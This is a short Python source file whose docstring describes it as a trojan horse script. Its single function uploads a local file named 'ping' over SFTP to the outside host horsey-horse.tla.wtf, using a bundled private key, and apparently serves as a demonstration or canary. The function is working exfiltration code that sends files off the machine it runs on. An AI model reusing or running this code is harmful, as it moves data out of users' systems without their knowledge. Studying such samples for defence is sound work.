import os
import subprocess
from datetime import datetime

HOST = "horsey-horse.tla.wtf"


def run_horse():
    """
    Runs our trojan horse script

    Exfiltrates the file "ping" to host
    """
    current_path = os.path.dirname(os.path.realpath(__file__))
    ping_path = os.path.join(current_path, "ping")
    target_path = f"{datetime.now().timestamp()}-ping"
    key_path = os.path.join(current_path, "horsey.key")
    # Make sure the file is usable for SFTP
    os.chmod(key_path, 0o600)
    proc = subprocess.Popen(
        ["sftp", "-qNi", key_path, f"horse@{HOST}:"],
        stdin=subprocess.PIPE,
    )
    proc.communicate(f"put {ping_path} {target_path}".encode())
